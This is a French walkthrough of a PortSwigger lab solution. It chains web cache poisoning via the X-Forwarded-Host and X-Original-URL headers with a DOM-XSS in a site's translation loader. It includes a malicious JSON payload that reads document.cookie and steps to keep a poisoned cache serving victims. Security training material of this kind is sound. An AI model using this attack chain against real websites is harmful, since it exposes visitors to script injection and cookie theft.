# Lab

https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria

## Payload

Avec Burp en cours d'exécution, chargez la page d'accueil du site Web.

Utilisez Param Miner pour identifier que les en-têtes `X-Forwarded-Host` et `X-Original-URL` sont pris en charge.

Dans Burp Repeater, expérimentez avec l'en-tête `X-Forwarded-Host` et observez qu'il peut être utilisé pour importer un fichier JSON arbitraire au lieu du fichier `translations.json`, qui contient des traductions de textes de l'interface utilisateur.

Remarquez que le site Web est vulnérable au DOM-XSS en raison de la manière dont la fonction `initTranslations()` traite les données provenant du fichier JSON pour toutes les langues sauf l'anglais.

Rendez-vous sur le serveur d'exploitation et modifiez le nom du fichier pour qu'il corresponde au chemin utilisé par le site Web vulnérable : `/resources/json/translations.json`

Dans l'en-tête, ajoutez le header `Access-Control-Allow-Origin: *` pour activer CORS.

Dans le corps, ajoutez un JSON malveillant qui correspond à la structure utilisée par le véritable fichier de traduction. Remplacez la valeur de l'une des traductions par une charge utile XSS appropriée, par exemple :

```json
{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
            "Description:": "Descripción"
        }
    }
}
```

Pour le reste de cette solution, nous utiliserons l'espagnol pour démontrer l'attaque. Veuillez noter que si vous avez injecté votre charge utile dans la traduction pour une autre langue, vous devrez également adapter les exemples en conséquence.

Stockez l'exploit.

Dans Burp, trouvez une requête GET pour `/?localized=1` qui inclut le cookie de langue pour l'espagnol : `lang=es`

Envoyez la requête à Burp Repeater. Ajoutez un cache buster et l'en-tête suivant, en n'oubliant pas de saisir votre propre ID de serveur d'exploitation : `X-Forwarded-Host: VOTRE-ID-DU-SERVEUR-D-EXPLOIT.exploit-server.net`

Envoyez la réponse et confirmez que votre serveur d'exploit est reflété dans la réponse.

Pour simuler la victime, chargez l'URL dans le navigateur et confirmez que l'alerte s'affiche.

Vous avez réussi à empoisonner le cache pour la page en espagnol, mais la langue de l'utilisateur cible est réglée sur l'anglais. Comme il n'est pas possible d'exploiter les utilisateurs dont la langue est réglée sur l'anglais, vous devez trouver un moyen de changer leur langue de force.

Dans Burp, allez dans `Proxy > Historique HTTP` et étudiez les requêtes et les réponses que vous avez générées. Remarquez que lorsque vous changez la langue sur la page en autre chose qu'anglais, cela déclenche une redirection, par exemple, vers /setlang/es. La langue sélectionnée par l'utilisateur est définie côté serveur en utilisant le cookie lang=es, et la page d'accueil est rechargée avec le paramètre ?localized=1.

Envoyez la requête `GET` pour la page d'accueil à Burp Repeater et ajoutez un cache buster.

Observez que le `X-Original-URL` peut être utilisé pour changer le chemin de la requête, vous pouvez donc explicitement définir `/setlang/es`. Cependant, vous constaterez que cette réponse ne peut pas être mise en cache car elle contient l'en-tête `Set-Cookie`.

Remarquez que la page d'accueil utilise parfois des barres obliques inversées comme séparateur de dossier. Notez que le serveur normalise ceux-ci en barres obliques à l'aide d'une redirection. Par conséquent, `X-Original-URL: /setlang\es` déclenche une réponse 302 qui redirige vers `/setlang/es`. Observez que cette réponse 302 est mise en cache et peut donc être utilisée pour forcer les autres utilisateurs à la version espagnole de la page d'accueil.

Vous devez maintenant combiner ces deux exploits. D'abord, empoisonnez la page GET `/?localized=1` en utilisant l'en-tête X-Forwarded-Host pour importer votre fichier JSON malveillant depuis le serveur d'exploit.

Maintenant, pendant que le cache est toujours empoisonné, empoisonnez également la page `GET /` en utilisant `X-Original-URL: /setlang\es` pour forcer tous les utilisateurs à la page en espagnol.

Pour simuler la victime, chargez la page en anglais dans le navigateur et assurez-vous que vous êtes redirigé et que l'alerte s'affiche.

Rejouez les deux requêtes en séquence pour garder le cache empoisonné sur les deux pages jusqu'à ce que la victime visite le site et que le lab soit résolu.